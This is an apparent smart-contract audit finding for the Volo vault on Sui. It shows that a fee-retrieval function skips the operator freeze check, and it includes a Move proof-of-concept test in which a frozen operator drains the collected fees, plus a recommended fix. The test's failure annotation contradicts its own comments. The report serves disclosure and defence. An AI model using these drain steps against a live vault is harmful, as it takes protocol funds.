# Audit Report

## Title
Frozen Operator Can Bypass Freeze Controls to Drain All Deposit/Withdraw Fees

## Summary
The `retrieve_deposit_withdraw_fee_operator()` function lacks the operator freeze check that is consistently enforced across all other operator functions. This allows a frozen operator to bypass the security freeze mechanism and drain the entire accumulated protocol fee balance, completely undermining the operator freeze control system.

## Finding Description

The vulnerability exists in the `retrieve_deposit_withdraw_fee_operator()` function which only requires an `OperatorCap` and does not validate if the operator is frozen. [1](#0-0) 

This function directly calls the underlying vault function without any operator freeze validation. The underlying implementation only checks vault version and status, but not operator freeze state. [2](#0-1) 

**Root Cause:** The function is missing two critical elements present in all other operator functions:
1. It does not take an `operation: &Operation` parameter
2. It does not call `vault::assert_operator_not_freezed(operation, cap)`

The protocol implements a comprehensive operator freeze mechanism stored in the Operation object's `freezed_operators` map. [3](#0-2) 

The freeze check function properly validates if an operator is frozen and aborts if they are. [4](#0-3) 

Every other operator function in the protocol consistently enforces this freeze check by taking both `operation: &Operation` and `cap: &OperatorCap` parameters and calling the freeze validation. Examples include:
- [5](#0-4) 
- [6](#0-5) 
- [7](#0-6) 
- [8](#0-7) 

The `retrieve_deposit_withdraw_fee_operator()` function is the **only** operator function that fails to implement this critical security check.

## Impact Explanation

**Direct Fund Impact:**
- A frozen operator can drain the entire `deposit_withdraw_fee_collected` balance from the vault
- These are accumulated protocol fees from all user deposits [9](#0-8)  and withdrawals [10](#0-9) 
- No amount limits exist beyond the available balance
- The vault structure stores this as `deposit_withdraw_fee_collected: Balance<T>` [11](#0-10) 

**Security Integrity Impact:**
- Complete bypass of the operator freeze mechanism for fee retrieval
- Undermines the admin's ability to prevent malicious operator actions through the freeze control
- When an admin freezes an operator (typically due to compromise or malicious behavior), the expectation is that ALL operator privileges are revoked

**Who is Affected:**
- Protocol treasury loses all accumulated deposit/withdraw fees
- Vault users indirectly affected as fees meant for protocol sustainability are stolen
- Trust in the operator freeze security control is compromised

## Likelihood Explanation

**Attacker Capabilities:**
- Requires only possession of an `OperatorCap`, which the frozen operator already legitimately has
- No additional privileges or exploits needed beyond the existing capability object

**Attack Complexity:**
- Trivial - single function call with amount parameter
- No complex state manipulation required
- No timing dependencies or race conditions

**Feasibility Conditions:**
- Function is publicly callable by any `OperatorCap` holder
- Works even when operator is marked as frozen in the Operation's `freezed_operators` map
- Only requires vault to be in normal status (not during operation), which is the standard state

**Probability Reasoning:**
High probability of exploitation if an operator is ever frozen for malicious behavior, as they would be strongly incentivized to extract remaining value before the capability is transferred away or further actions are taken by administrators.

## Recommendation

Add the missing operator freeze check to maintain consistency with all other operator functions:

```move
public fun retrieve_deposit_withdraw_fee_operator<PrincipalCoinType>(
    operation: &Operation,  // ADD THIS PARAMETER
    cap: &OperatorCap,
    vault: &mut Vault<PrincipalCoinType>,
    amount: u64,
): Balance<PrincipalCoinType> {
    vault::assert_operator_not_freezed(operation, cap);  // ADD THIS CHECK
    vault.retrieve_deposit_withdraw_fee(amount)
}
```

This ensures the function follows the same security pattern as all other operator functions in the protocol.

## Proof of Concept

```move
#[test]
#[expected_failure(abort_code = vault::ERR_OPERATOR_FREEZED)]
// This test should fail (operator frozen check should abort), but currently succeeds - demonstrating the vulnerability
public fun test_frozen_operator_can_drain_fees() {
    let mut s = test_scenario::begin(OWNER);
    let mut clock = clock::create_for_testing(s.ctx());
    
    // Initialize vault
    init_vault::init_vault(&mut s, &mut clock);
    init_vault::init_create_vault<SUI_TEST_COIN>(&mut s);
    
    // Create operator cap
    s.next_tx(OWNER);
    {
        let admin_cap = s.take_from_sender<AdminCap>();
        let operator_cap = vault_manage::create_operator_cap(&admin_cap, s.ctx());
        transfer::public_transfer(operator_cap, OWNER);
        s.return_to_sender(admin_cap);
    };
    
    // Deposit to accumulate fees
    s.next_tx(OWNER);
    {
        let mut vault = s.take_shared<Vault<SUI_TEST_COIN>>();
        let coin = coin::mint_for_testing<SUI_TEST_COIN>(10_000_000_000, s.ctx());
        // This will collect deposit fees into deposit_withdraw_fee_collected
        vault.submit_deposit(coin, s.ctx());
        test_scenario::return_shared(vault);
    };
    
    // Freeze the operator
    s.next_tx(OWNER);
    {
        let admin_cap = s.take_from_sender<AdminCap>();
        let mut operation = s.take_shared<Operation>();
        let operator_cap = s.take_from_sender<OperatorCap>();
        
        vault_manage::set_operator_freezed(&admin_cap, &mut operation, operator_cap.operator_id(), true);
        
        test_scenario::return_shared(operation);
        s.return_to_sender(admin_cap);
        s.return_to_sender(operator_cap);
    };
    
    // VULNERABILITY: Frozen operator can still drain all fees
    // This should fail with ERR_OPERATOR_FREEZED but currently succeeds
    s.next_tx(OWNER);
    {
        let operator_cap = s.take_from_sender<OperatorCap>();
        let mut vault = s.take_shared<Vault<SUI_TEST_COIN>>();
        
        let fee_balance = vault.deposit_withdraw_fee_collected();
        // Frozen operator drains all accumulated fees
        let stolen_fees = vault_manage::retrieve_deposit_withdraw_fee_operator(
            &operator_cap,
            &mut vault,
            fee_balance
        );
        
        // Fees successfully stolen despite operator being frozen
        assert!(stolen_fees.value() > 0);
        stolen_fees.destroy_for_testing();
        
        test_scenario::return_shared(vault);
        s.return_to_sender(operator_cap);
    };
    
    clock.destroy_for_testing();
    s.end();
}
```

**Notes:**

This vulnerability represents a critical gap in the operator freeze security control mechanism. The freeze functionality exists specifically to prevent compromised or malicious operators from executing any vault operations, but this single function creates a backdoor allowing fee drainage. The issue is particularly severe because:

1. **Pattern Inconsistency**: This is the ONLY operator function across the entire codebase (operation.move, reward_manager.move) that doesn't implement the freeze check
2. **Security Assumption Violation**: The protocol architecture assumes frozen operators cannot perform ANY operations
3. **No Defense in Depth**: There are no secondary controls to prevent this - once frozen, admins expect complete privilege revocation

The fix is straightforward and maintains consistency with the existing security pattern used throughout the protocol.

### Citations

**File:** volo-vault/sources/manage.move (L150-156)
```text
public fun retrieve_deposit_withdraw_fee_operator<PrincipalCoinType>(
    _: &OperatorCap,
    vault: &mut Vault<PrincipalCoinType>,
    amount: u64,
): Balance<PrincipalCoinType> {
    vault.retrieve_deposit_withdraw_fee(amount)
}
```

**File:** volo-vault/sources/volo_vault.move (L89-92)
```text
public struct Operation has key, store {
    id: UID,
    freezed_operators: Table<address, bool>,
}
```

**File:** volo-vault/sources/volo_vault.move (L96-105)
```text
public struct Vault<phantom T> has key, store {
    id: UID,
    version: u64,
    // ---- Pool Info ---- //
    status: u8,
    total_shares: u256,
    locking_time_for_withdraw: u64, // Locking time for withdraw (ms)
    locking_time_for_cancel_request: u64, // Time to cancel a request (ms)
    // ---- Fee ---- //
    deposit_withdraw_fee_collected: Balance<T>,
```

**File:** volo-vault/sources/volo_vault.move (L380-385)
```text
public(package) fun assert_operator_not_freezed(operation: &Operation, cap: &OperatorCap) {
    let cap_id = cap.operator_id();
    // If the operator has ever been freezed, it will be in the freezed_operator map, check its value
    // If the operator has never been freezed, no error will be emitted
    assert!(!operator_freezed(operation, cap_id), ERR_OPERATOR_FREEZED);
}
```

**File:** volo-vault/sources/volo_vault.move (L830-836)
```text
    let deposit_fee = coin_amount * self.deposit_fee_rate / RATE_SCALING;

    // let actual_deposit_amount = coin_amount - deposit_fee;
    let mut coin_balance = coin.into_balance();
    // Split the deposit fee to the fee collected
    let deposit_fee_balance = coin_balance.split(deposit_fee as u64);
    self.deposit_withdraw_fee_collected.join(deposit_fee_balance);
```

**File:** volo-vault/sources/volo_vault.move (L1040-1042)
```text
    let fee_amount = amount_to_withdraw * self.withdraw_fee_rate / RATE_SCALING;
    let fee_balance = withdraw_balance.split(fee_amount as u64);
    self.deposit_withdraw_fee_collected.join(fee_balance);
```

**File:** volo-vault/sources/volo_vault.move (L1544-1557)
```text
public(package) fun retrieve_deposit_withdraw_fee<PrincipalCoinType>(
    self: &mut Vault<PrincipalCoinType>,
    amount: u64,
): Balance<PrincipalCoinType> {
    self.check_version();
    self.assert_normal();

    emit(DepositWithdrawFeeRetrieved {
        vault_id: self.vault_id(),
        amount: amount,
    });

    self.deposit_withdraw_fee_collected.split(amount)
}
```

**File:** volo-vault/sources/operation.move (L381-391)
```text
public fun execute_deposit<PrincipalCoinType>(
    operation: &Operation,
    cap: &OperatorCap,
    vault: &mut Vault<PrincipalCoinType>,
    reward_manager: &mut RewardManager<PrincipalCoinType>,
    clock: &Clock,
    config: &OracleConfig,
    request_id: u64,
    max_shares_received: u256,
) {
    vault::assert_operator_not_freezed(operation, cap);
```

**File:** volo-vault/sources/operation.move (L449-460)
```text
public fun execute_withdraw<PrincipalCoinType>(
    operation: &Operation,
    cap: &OperatorCap,
    vault: &mut Vault<PrincipalCoinType>,
    reward_manager: &mut RewardManager<PrincipalCoinType>,
    clock: &Clock,
    config: &OracleConfig,
    request_id: u64,
    max_amount_received: u64,
    ctx: &mut TxContext,
) {
    vault::assert_operator_not_freezed(operation, cap);
```

**File:** volo-vault/sources/operation.move (L529-537)
```text
public fun deposit_by_operator<PrincipalCoinType>(
    operation: &Operation,
    cap: &OperatorCap,
    vault: &mut Vault<PrincipalCoinType>,
    clock: &Clock,
    config: &OracleConfig,
    coin: Coin<PrincipalCoinType>,
) {
    vault::assert_operator_not_freezed(operation, cap);
```

**File:** volo-vault/sources/reward_manager.move (L276-283)
```text
public fun create_reward_buffer_distribution<PrincipalCoinType, RewardCoinType>(
    self: &mut RewardManager<PrincipalCoinType>,
    operation: &Operation,
    cap: &OperatorCap,
    clock: &Clock,
) {
    self.check_version();
    vault::assert_operator_not_freezed(operation, cap);
```
